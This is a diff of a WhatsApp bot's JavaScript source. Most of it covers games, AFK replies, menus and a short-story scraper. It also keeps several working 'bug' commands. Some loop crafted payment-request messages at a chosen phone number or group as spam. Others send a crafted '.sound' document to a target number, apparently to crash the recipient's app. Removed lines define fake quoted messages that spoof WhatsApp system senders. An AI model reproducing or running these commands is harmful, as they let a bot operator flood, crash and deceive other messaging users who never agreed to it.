+	    if (!roof.pilih && !roof.pilih2) XeonBotInc.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
+	    else if (!roof.pilih || !roof.pilih2) {
+	    win = !roof.pilih ? roof.p2 : roof.p
+	    XeonBotInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
+	    }
+	    delete this.suit[roof.id]
+	    return !0
+	    }, roof.timeout)
+	    }
+	    let jwb = m.sender == roof.p
+	    let jwb2 = m.sender == roof.p2
+	    let g = /scissors/i
+	    let b = /rock/i
+	    let k = /paper/i
+	    let reg = /^(scissors|rock|paper)/i
+	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
+	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
+	    roof.text = m.text
+	    reply(`You Have Chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting For The Opponent To Choose` : ''}`)
+	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, '_The Opponent Has Chosen_\nNow It Is Your Turn', 0)
+	    }
+	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
+	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
+	    roof.text2 = m.text
+	    reply(`You Have Chosen ${m.text} ${!roof.pilih ? `\n\nWaiting For The Opponent To Choose` : ''}`)
+	    if (!roof.pilih) XeonBotInc.sendText(roof.p, '_The Opponent Has Chosen_\nNow It Is Your Turn', 0)
+	    }
+	    let stage = roof.pilih
+	    let stage2 = roof.pilih2
+	    if (roof.pilih && roof.pilih2) {
+	    clearTimeout(roof.waktu_milih)
+	    if (b.test(stage) && g.test(stage2)) win = roof.p
+	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
+	    else if (g.test(stage) && k.test(stage2)) win = roof.p
+	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
+	    else if (k.test(stage) && b.test(stage2)) win = roof.p
+	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
+	    else if (stage == stage2) tie = true
+	    XeonBotInc.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}
+
+@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
+@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost \n`}
+`.trim(), m, { mentions: [roof.p, roof.p2] })
+	    delete this.suit[roof.id]
+	    }
+	    }
+	    
+	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
+	    for (let jid of mentionUser) {
+            let user = global.db.data.users[jid]
+            if (!user) continue
+            let afkTime = user.afkTime
+            if (!afkTime || afkTime < 0) continue
+            let reason = user.afkReason || ''
+            reply(`
+Don't tag him!
+He's in AFK/Offline ${reason ? 'dengan alasan ' + reason : 'no reason'}
+It's been ${clockString(new Date - afkTime)}
+`.trim())
+        }
+
+        if (db.data.users[m.sender].afkTime > -1) {
+            let user = global.db.data.users[m.sender]
+            reply(`
+You Came Back Online From AFK${user.afkReason ? ' after ' + user.afkReason : ''}
+In ${clockString(new Date - user.afkTime)}
+`.trim())
+            user.afkTime = -1
+            user.afkReason = ''
+        }
+        
+       //react function
+const reactionMessage = {
+                    react: {
+                        text: args[0],
+                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
+                    }
                 }
                 
-               
-             
-                const ftoko = {
-                key: {
-                fromMe: false,
-                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
-                },
-                message: {
-                "productMessage": {
-                "product": {
-                "productImage":{
-                "mimetype": "image/jpeg",
-                "jpegThumbnail": BotLogo
-                },
-                "title": `${global.OwnerName}`, 
-                "description": `${global.BotName}`, 
-                "currencyCode": "USD",
-                "priceAmount1000": "2000",
-                "retailerId": `${global.WaterMark}`,
-                "productImageCount": 1
-                },
-                "businessOwnerJid": `0@s.whatsapp.net`
-                }
-                }
-                }
-
-                const fgi = {
-                  key: { 
-                        fromMe: false,
-                       participant: `0@s.whatsapp.net`, ...(from ? 
-                  { remoteJid: "916909137213-1613049930@g.us" } : {}) 
-                               },
-                  message: { 
-                                "videoMessage": { 
-                                "title": `Miku`,
-                                "h": `Miku`,
-                                'duration': '99999', 
-                                'gifPlayback': 'true', 
-                                'caption': `Fantox`,
-                                'jpegThumbnail': fs.readFileSync('./Assets/miku.mp4')
-                                       }
-                                      }
-                                   } 
-//
-crotol = await getBuffer (`https://telegra.ph/file/9c8909ec77adaf2ef1efb.jpg`)                                  
-//faketest
-const ftl = {
-key: {
-fromMe: false,
-"participant":"0@s.whatsapp.net", 
-"remoteJid": "916909137213-1604595598@g.us"},
-"message": {orderMessage: {itemCount: 9999999,
-status: 200,
-thumbnail: crotol,
-surface: 200, 
-message: `Miuna Bot`,
-orderTitle: 'Ri', 
-sellerJid: '0@s.whatsapp.net'}}, 
-contextInfo: {
-"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
-
-//FAKEREPLY TROLI
-const ftroli = {
-  key : {
-  participant : '0@s.whatsapp.net'
-  },
-  message: {
-  orderMessage: {
-  itemCount : 1,
-  status: 1,
-  surface : 1,
-  message: `${global.OwnerName}`, 
-  orderTitle: `${global.BotName}`,
-  thumbnail: BotLogo, //Pic
-  sellerJid: '0@s.whatsapp.net'
-  
-  }
-  }
-  }
-  //FAKEREPLY LOCATION
-  const flokasi = {
-  key : {
-   participant : '0@s.whatsapp.net'
-  },
-  message: {
-  locationMessage: {
-  name: `Ri`,
-  jpegThumbnail: BotLogo
-  }
-  }
-  }
-  //FAKEREPLY DOCUMENT
-  const fdocs = {
-  key : {
-   participant : '0@s.whatsapp.net'
-  },
-  message: {
-  documentMessage: {
-  title: `${global.BotName}`, 
-  jpegThumbnail: BotLogo
-  }
-  }
-  }
-  //FAKEREPLY VIDEO
-  const fvideo = {
-  key: { 
-  fromMe: false,
-  participant: `0@s.whatsapp.net`, ...(from ? 
-  { remoteJid: "916909137213-1613049930@g.us" } : {}) 
-  },
-  message: { 
-  "videoMessage": { 
-  "title": `${global.BotName}`,
-  "h": `${global.OwnerName}`,
-  'seconds': '30', 
-  'caption': `${global.WaterMark}`,
-  'jpegThumbnail': BotLogo
-  }
-  }
-  }
-  //FAKEREPLY GROUPINVITE
-  const fgclink = {
-  "key": {
-  "fromMe": false,
-  "participant": "0@s.whatsapp.net",
-  "remoteJid": "0@s.whatsapp.net"
-  },
-  "message": {
-  "groupInviteMessage": {
-  "groupJid": "916909137213-1616169743@g.us",
-  "inviteCode": `${global.OwnerName}`,
-  "groupName": `${global.BotName}`, 
-  "caption":`${global.WaterMark}`, 
-  'jpegThumbnail': BotLogo
-  }
-  }
-  }
-  //FAKEREPLY GIF
-  const fgif = {
-  key: { 
-  fromMe: false,
-  participant: `0@s.whatsapp.net`, ...(from ? 
-  { remoteJid: "916909137213-1613049930@g.us" } : {}) 
-  },
-  message: { 
-   "videoMessage": { 
-   "title":`${global.BotName}`,
-   "h": `${global.OwnerName}`,
-   'seconds': "30", 
-   'gifPlayback': 'true', 
-   'caption': `${global.WaterMark}`,
-   'jpegThumbnail': BotLogo
-  }
-  }
-  } 
-  //FAKEREPLY TEXT WITH THUMBNAIL
-  const ftextt = {
-  key: { 
-  fromMe: false,
-  participant: `0@s.whatsapp.net`, ...(from ? 
-  { remoteJid: "916909137213-1613049930@g.us" } : {}) 
-  },
-  message: { 
-  "extendedTextMessage": {
-   "text":`${global.OwnerName}`,
-  "title": `${global.BotName}`,
-   'jpegThumbnail': BotLogo
-  }
-  } 
-  }
-  //FAKEREPLY VN
-  const fvn = {
-key: { 
-fromMe: false, 
-            participant: `0@s.whatsapp.net`, 
-            ...({ remoteJid: "status@broadcast" }) 
-        }, 
-message: { 
-"audioMessage": {
-"mimetype":"audio/ogg; codecs=opus",
-"seconds": "400000271",
-"ptt": "true"
-}
-} 
-}
-  l = 1
-  monospace = '```'
-  const timestampe = speed();
-  const latensie = speed() - timestampe
-  const levelMenu = getLevelingLevel(m.sender)
-  
-  const xpMenu = getLevelingXp(m.sender)
-  const uangku = getBalance(m.sender, balance)
-  const reqXp  = 200 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
-  const jumlahUser = pendaftar.length
-    if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
-    if (!isInventory){ addInventori(m.sender) }
-    if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }
-
-
-    const menulist = `
-    Konichiwa ${pushname} dear 👋. I am ${global.BotName}, a bot developed by: Fantox to take your WhatsApp usage into next level.
-        
-       「 System Info 」
-    
-    Speed : ${latensie.toFixed(4)} miliseconds
-    Up Time : ${runtime(process.uptime())}
-    Bot Name : ${global.BotName}
-    Owner Name : ${global.OwnerName}
-    𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : Amazon AWS
-    𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿 : ${Object.keys(global.db.users).length}
-    
-    
-       「 User Info 」
-    
-    User Level: ${levelMenu}
-    User XP : ${xpMenu} \ ${reqXp}
-    User Role : ${role}
-    
-    
-       「 User Bank 」
-    
-    User Balance : ${uangku}
-    Iron : ${getBesi(m.sender)}
-    Gold : ${getEmas(m.sender)}
-    Emarald : ${getEmerald(m.sender)}
-    Potion : ${getPotion(m.sender)}
-    
-    
-    Type *-menu* or press any button below to start using *${global.BotName}*
-    
-    ©️ *${global.BotName}* All Rights Reserved by: *Fantox*
-    `
-        const qtod = m.quoted? "true":"false"
-        
-        
-
+                const timestampe = speed();
+const latensie = speed() - timestampe
+                const menulist = `┌─❖
+│「 Hi 👋 」
+└┬❖ 「 ${pushname} 」
+┌┤✑  How Are You? 😄
+│└────────────┈ ⳹
+│
+└─「 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊 」       
+│𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
+│𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
+│𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : ${global.botname}
+│𝗢𝘄𝗻𝗲𝗿 𝗡𝗮𝗺𝗲 : ${global.ownername}
+│𝗢𝘄𝗻𝗲𝗿 𝗡𝗼. : ${global.owner}
+│𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : ${os.hostname()}
+│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
+│𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿 : ${Object.keys(global.db.data.users).length}
+└┬────────────┈ ⳹
+   │✑  Please Select
+   │✑  The Button Below
+   └─────────────┈ ⳹`
+   
+   //randoming function
 function pickRandom(list) {
 return list[Math.floor(list.length * Math.random())]
 }
+//document randomizer
 let documents = [doc1,doc2,doc3,doc4,doc5,doc6]
 let docs = pickRandom(documents)
-           
+
+// short story
+async function cerpen (category) {
+    return new Promise((resolve, reject) => {
+        let title = category.toLowerCase().replace(/[()*]/g, "")
+        let judul = title.replace(/\s/g, "-")
+        let page = Math.floor(Math.random() * 5)
+        axios.get('http://cerpenmu.com/category/cerpen-'+judul+'/page/'+page)
+        .then((get) => {
+            let $ = cheerio.load(get.data)
+            let link = []
+            $('article.post').each(function (a, b) {
+                link.push($(b).find('a').attr('href'))
+            })
+            let random = link[Math.floor(Math.random() * link.length)]
+            axios.get(random)
+            .then((res) => {
+                let $$ = cheerio.load(res.data)
+                let hasil = {
+                    title: $$('#content > article > h1').text(),
+                    author: $$('#content > article').text().split('Short Story: ')[1].split('Category: ')[0],
+                    kategori: $$('#content > article').text().split('Category: ')[1].split('\n')[0],
+                    lolos: $$('#content > article').text().split('Passed moderation on: ')[1].split('\n')[0],
+                    cerita: $$('#content > article > p').text()
+                }
+                resolve(hasil)
+            })
+        })
+    })
+}
 
 switch(command) {
-	case 'kisahnabi':{
+
+case 'kisahnabi':{
 	if (isBan) return reply (mess.ban)
 	if (!args[0]) return reply (`ᴍᴀsᴜᴋᴀɴ ɴᴀᴍᴀ ɴᴀʙɪɴʏᴀ ᴋᴀᴋ!\nᴄᴏɴᴛᴏʜ : ${prefix + command}`)
 	ri = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${args.join(" ")}?apikey=${lolkey}`)
@@ -1528,7 +1155,7 @@ let teks = `
     buttons : buttons,
     headerType : 4
 	}
-	Miku.sendMessage(m.chat , buttonMessage , {quoted : m})
+	XeonBotInc.sendMessage(m.chat , buttonMessage , {quoted : m})
 	}
 	break
 
@@ -1620,13 +1247,13 @@ if (args[0] === "on") {
 if (antiVirtex) return replay('Already activated')
 ntvirtex.push(from)
 replay('Success in turning on antivirus in this group')
-var groupe = await Miku.groupMetadata(from)
+var groupe = await XeonBotInc.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-Miku.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!antiVirtex) return replay('Already deactivated')
 let off = ntvirtex.indexOf(from)
@@ -1637,7 +1264,7 @@ replay('Success in turning off antivirus this group')
   { buttonId: `${prefix + command} on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `${prefix + command} off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
-  await Miku.sendButtonText(m.chat, buttonsntvirtex, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  await XeonBotInc.sendButtonText(m.chat, buttonsntvirtex, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
   }
   }
   break
@@ -1652,7 +1279,7 @@ let teks = `â•â•âœªã€˜ *THIS IS A BUG BRO? â˜ºï¸* ã€�
 for (let mem of participants) {
 teks += `â­” @${mem.id.split('@')[0]}\n`
 }
-Miku.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
+XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
 }
 break
 
@@ -1663,7 +1290,7 @@ if (args.length < 1) return m.reply(`ᴄᴏɴᴛᴏʜ : ${prefix + command} ɴ�
 num = q.split('/')[0]
 jumlah = q.split('/')[1]
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./Rimed/xpic.jpeg') }, { upload: Miku.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./Rimed/xpic.jpeg') }, { upload: XeonBotInc.waUploadToServer })
 var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
 "requestPaymentMessage": {
 "currencyCodeIso4217": "IDR",
@@ -1672,7 +1299,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "text": wm,
 }
 }}), { userJid: m.chat, quoted: doc})
-Miku.relayMessage(`${num}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+XeonBotInc.relayMessage(`${num}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
 }
 m.reply(`sᴜᴋsᴇs ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ ᴋᴇ ɴᴏᴍᴇʀ : ${num}\nᴛᴏᴛᴀʟ sᴘᴀᴍ : ${jumlah}`)
 }
@@ -1685,7 +1312,7 @@ if (args.length < 1) return m.reply(`ᴄᴏɴᴛᴏʜ : ${prefix + command} ɪ�
 num = q.split('/')[0]
 jumlah = q.split('/')[1]
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./Rimed/xpic.jpeg') }, { upload: Miku.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./Rimed/xpic.jpeg') }, { upload: XeonBotInc.waUploadToServer })
 var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
 "requestPaymentMessage": {
 "currencyCodeIso4217": "IDR",
@@ -1694,7 +1321,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "text": `MY DEVELOPER HW MODS WA`,
 }
 }}), { userJid: m.chat, quoted: doc})
-Miku.relayMessage(`${num}@g.us`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+XeonBotInc.relayMessage(`${num}@g.us`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
 }
 reply(`sᴜᴋsᴇs ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ ᴋᴇ : ${num}\nᴛᴏᴛᴀʟ sᴘᴀᴍ : ${jumlah}`)
 }
@@ -1703,7 +1330,7 @@ case 'bugpmv2': {
 if (!isMod) return reply (mess.mod)
 if (!args[0]) return reply (`ᴄᴏɴᴛᴏʜ : ${prefix + command} 𝟼𝟸𝟾𝟿𝟷𝟶𝟷𝟷𝟷𝟸𝟷𝟹`)
 lodaChoos = fs.readFileSync('./Rimed/randiKaBaccha.sound')
-Miku.sendMessage(`${args[0]}@s.whatsapp.net`, {document: lodaChoos, mimetype: 'application/octet-stream', fileName:`${BotName} ${xeonbut2}.sound` }, {quoted:doc})
+XeonBotInc.sendMessage(`${args[0]}@s.whatsapp.net`, {document: lodaChoos, mimetype: 'application/octet-stream', fileName:`${BotName} ${xeonbut2}.sound` }, {quoted:doc})
 reply (`sᴜᴋsᴇs ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ ✅`)
 }
 break
@@ -1711,7 +1338,7 @@ case 'bugpmv3': {
 if (!isMod) return reply (mess.mod)
 if (!args[0]) return reply (`ᴄᴏɴᴛᴏʜ : ${prefix + command} 𝟼𝟸𝟾𝟿𝟷𝟶𝟷𝟷𝟷𝟸𝟷𝟹`)
  lodaChoos2 = fs.readFileSync('./Rimed/randiKaBaccha.sound')
- Miku.sendMessage(`${args[0]}@s.whatsapp.net`, {document: lodaChoos2, mimetype: '', fileName:`${BotName} ${xeonbut2}.sound` }, {quoted:doc})
+ XeonBotInc.sendMessage(`${args[0]}@s.whatsapp.net`, {document: lodaChoos2, mimetype: '', fileName:`${BotName} ${xeonbut2}.sound` }, {quoted:doc})
  reply (`sᴜᴋsᴇs ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ!`)
  }
  break
@@ -1738,7 +1365,7 @@ caption : `sɪʟᴀʜᴋᴀɴ ᴛᴜᴀɴ!`,
 buttons : asukowe,
 headerType : 1
 }
-await Miku.sendMessage(m.chat, buttonasu, {quoted : m}).catch(err=>{return(`Engror banh`)
+await XeonBotInc.sendMessage(m.chat, buttonasu, {quoted : m}).catch(err=>{return(`Engror banh`)
 })
 }
 break
@@ -1755,7 +1382,7 @@ let random = anu[Math.floor(Math.random() * anu.length)]
 let hasil = `ᴊᴀᴡᴀʙʟᴀʜ ᴘᴇʀᴛᴀɴʏᴀᴀɴ ʙᴇʀɪᴋᴜᴛ ɪɴɪ. :\n${random.soal}\n\nᴀᴅᴀ *${random.jawaban.length}* ᴊᴀᴡᴀʙᴀɴ ${random.jawaban.find(v => v.includes(' ')) ? `(ʙᴇʙᴇʀᴀᴘᴀ ᴊᴀᴡᴀʙᴀɴ ᴍᴇᴍɪʟɪᴋɪ sᴘᴀsɪ)` : ''}`.trim()
 _family100['family100'+m.chat] = {
 id: 'family100'+m.chat,
-pesan: await Miku.sendText(m.chat, hasil, m),...random,
+pesan: await XeonBotInc.sendText(m.chat, hasil, m),...random,
 terjawab: Array.from(random.jawaban, () => false),
 hadiah: 6,}
 }
@@ -1768,13 +1395,13 @@ if (isBan) return reply (mess.ban)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return replay(`ᴀᴅᴀ ᴘᴇʀᴍᴀɪɴᴀɴ ʏᴀɴɢ ʙᴇʟᴜᴍ ᴅɪsᴇʟᴇsᴀɪᴋᴀɴ!!!`)
                     let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                     let result = anu[Math.floor(Math.random() * anu.length)]
-                    Miku.sendText(m.chat, `sɪᴋᴀʜᴋᴇᴜɴ ᴊᴀᴡᴀʙ sᴏᴀʟ ᴅɪʙᴀᴡᴀʜ ɪɴɪ!!\n-----------\n${result.soal}\n-----------\nᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ 𝟼𝟶ᴅᴇᴛɪᴋ ᴅɪᴍᴜʟᴀɪ ᴅᴀʀɪ sᴇᴋᴀʀᴀɴɢ!!!\n\nᴊᴀᴡᴀʙɴʏᴀ ᴘᴀᴋᴇ ʜᴜʀᴜғ ᴋᴇᴄɪʟ sᴇᴍᴜᴀ ʏᴀʜ!`, m).then(() => {
+                    XeonBotInc.sendText(m.chat, `sɪᴋᴀʜᴋᴇᴜɴ ᴊᴀᴡᴀʙ sᴏᴀʟ ᴅɪʙᴀᴡᴀʜ ɪɴɪ!!\n-----------\n${result.soal}\n-----------\nᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ 𝟼𝟶ᴅᴇᴛɪᴋ ᴅɪᴍᴜʟᴀɪ ᴅᴀʀɪ sᴇᴋᴀʀᴀɴɢ!!!\n\nᴊᴀᴡᴀʙɴʏᴀ ᴘᴀᴋᴇ ʜᴜʀᴜғ ᴋᴇᴄɪʟ sᴇᴍᴜᴀ ʏᴀʜ!`, m).then(() => {
                     tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                     })
                     await sleep(60000)
                     if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                     console.log("Answer: " + result.jawaban)
-Miku.sendMessage(m.chat, {text : `ᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ ᴛᴇʟᴀʜ ʜᴀʙɪs\n\nᴊᴀᴡᴀʙᴀɴɴʏᴀ ᴀᴅᴀʟᴀʜ : ${tebakkalimat[m.sender.split('@')[0]]}`},{quoted : m})
+XeonBotInc.sendMessage(m.chat, {text : `ᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ ᴛᴇʟᴀʜ ʜᴀʙɪs\n\nᴊᴀᴡᴀʙᴀɴɴʏᴀ ᴀᴅᴀʟᴀʜ : ${tebakkalimat[m.sender.split('@')[0]]}`},{quoted : m})
                     delete tebakkalimat[m.sender.split('@')[0]]
                     }
                 }
@@ -1784,13 +1411,13 @@ if (isBan) return reply (`Turu`)
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return replay(`ᴀᴅᴀ ᴘᴇʀᴍᴀɪɴᴀɴ ʏᴀɴɢ ʙᴇʟᴜᴍ ᴅɪsᴇʟᴇsᴀɪᴋᴀɴ!!!`)
  let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
-Miku.sendText(m.chat, `sᴏᴀʟ : ${result.soal}\n\nᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ 𝟼𝟶ᴅᴇᴛɪᴋ ᴅɪᴍᴜʟᴀɪ ᴅᴀʀɪ sᴇᴋᴀʀᴀɴɢ!!!\n\nᴊᴀᴡᴀʙɴʏᴀ ᴘᴀᴋᴇ ʜᴜʀᴜғ ᴋᴇᴄɪʟ sᴇᴍᴜᴀ ʏᴀʜ!`, m).then(() => {
+XeonBotInc.sendText(m.chat, `sᴏᴀʟ : ${result.soal}\n\nᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ 𝟼𝟶ᴅᴇᴛɪᴋ ᴅɪᴍᴜʟᴀɪ ᴅᴀʀɪ sᴇᴋᴀʀᴀɴɢ!!!\n\nᴊᴀᴡᴀʙɴʏᴀ ᴘᴀᴋᴇ ʜᴜʀᴜғ ᴋᴇᴄɪʟ sᴇᴍᴜᴀ ʏᴀʜ!`, m).then(() => {
                     tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                     })
                     await sleep(60000)
                     if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                     console.log("Answer: " + result.jawaban)
-                    Miku.sendMessage(m.chat, {image : {url :'https://telegra.ph/file/784d202c3a634bc7140c9.jpg' }, caption : `ᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ ᴛᴇʟᴀʜ ʜᴀʙɪs!\n\nᴊᴀᴡᴀʙᴀɴɴʏᴀ ᴀᴅᴀʟᴀʜ : ${tebakkata[m.sender.split('@')[0]]}`}, {quoted : m})
+                    XeonBotInc.sendMessage(m.chat, {image : {url :'https://telegra.ph/file/784d202c3a634bc7140c9.jpg' }, caption : `ᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ ᴛᴇʟᴀʜ ʜᴀʙɪs!\n\nᴊᴀᴡᴀʙᴀɴɴʏᴀ ᴀᴅᴀʟᴀʜ : ${tebakkata[m.sender.split('@')[0]]}`}, {quoted : m})
                     delete tebakkata[m.sender.split('@')[0]]
                     }
 }
@@ -1803,13 +1430,13 @@ case 'tebakgambar':{
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return replay(`ᴀᴅᴀ ᴘᴇʀᴍᴀɪɴᴀɴ ʏᴀɴɢ ʙᴇʟᴜᴍ ᴅɪsᴇʟᴇsᴀɪᴋᴀɴ!!!`)
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
-Miku.sendImage(m.chat, result.img, `Clue : ${result.deskripsi}\n\nnᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ 𝟼𝟶ᴅᴇᴛɪᴋ ᴅɪᴍᴜʟᴀɪ ᴅᴀʀɪ sᴇᴋᴀʀᴀɴɢ!!!\nᴊᴀᴡᴀʙɴʏᴀ ᴘᴀᴋᴇ ʜᴜʀᴜғ ᴋᴇᴄɪʟ sᴇᴍᴜᴀ ʏᴀʜ!`, m).then(() => {
+XeonBotInc.sendImage(m.chat, result.img, `Clue : ${result.deskripsi}\n\nnᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ 𝟼𝟶ᴅᴇᴛɪᴋ ᴅɪᴍᴜʟᴀɪ ᴅᴀʀɪ sᴇᴋᴀʀᴀɴɢ!!!\nᴊᴀᴡᴀʙɴʏᴀ ᴘᴀᴋᴇ ʜᴜʀᴜғ ᴋᴇᴄɪʟ sᴇᴍᴜᴀ ʏᴀʜ!`, m).then(() => {
 tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                     })
                     await sleep(60000)
                     if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                     console.log("Answer: " + result.jawaban)
-Miku.sendMessage(m.chat, {image : {url : 'https://telegra.ph/file/827fbd7afbcf586dacbce.jpg'}, caption : `ᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ ᴛᴇʟᴀʜ ʜᴀʙɪs!\n\nᴊᴀᴡᴀʙᴀɴɴʏᴀ ᴀᴅᴀʟᴀʜ : ${tebakgambar[m.sender.split('@')[0]]}`},{quoted : m})
+XeonBotInc.sendMessage(m.chat, {image : {url : 'https://telegra.ph/file/827fbd7afbcf586dacbce.jpg'}, caption : `ᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ ᴛᴇʟᴀʜ ʜᴀʙɪs!\n\nᴊᴀᴡᴀʙᴀɴɴʏᴀ ᴀᴅᴀʟᴀʜ : ${tebakgambar[m.sender.split('@')[0]]}`},{quoted : m})
                     delete tebakgambar[m.sender.split('@')[0]]
                     }
         
@@ -1821,14 +1448,14 @@ if (isBan) return reply (mess.ban)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return replay(`ᴀᴅᴀ ᴘᴇʀᴍᴀɪɴᴀɴ ʏᴀɴɢ ʙᴇʟᴜᴍ ᴅɪsᴇʟᴇsᴀɪᴋᴀɴ!!!`)
                     let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                     let result = anu[Math.floor(Math.random() * anu.length)]
-                   Miku.sendText(m.chat, `ᴊᴀᴡᴀʙʟᴀʜ sᴏᴀʟ ᴅɪʙᴀᴡᴀʜ ɪɴɪ!\n\n*${result.soal}*\n\nᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ 𝟼𝟶ᴅᴇᴛɪᴋ ᴅɪᴍᴜʟᴀɪ ᴅᴀʀɪ sᴇᴋᴀʀᴀɴɢ!!!\nᴊᴀᴡᴀʙɴʏᴀ ᴘᴀᴋᴇ ʜᴜʀᴜғ ᴋᴇᴄɪʟ sᴇᴍᴜᴀ ʏᴀʜ!`, m).then(() => {
+                   XeonBotInc.sendText(m.chat, `ᴊᴀᴡᴀʙʟᴀʜ sᴏᴀʟ ᴅɪʙᴀᴡᴀʜ ɪɴɪ!\n\n*${result.soal}*\n\nᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ 𝟼𝟶ᴅᴇᴛɪᴋ ᴅɪᴍᴜʟᴀɪ ᴅᴀʀɪ sᴇᴋᴀʀᴀɴɢ!!!\nᴊᴀᴡᴀʙɴʏᴀ ᴘᴀᴋᴇ ʜᴜʀᴜғ ᴋᴇᴄɪʟ sᴇᴍᴜᴀ ʏᴀʜ!`, m).then(() => {
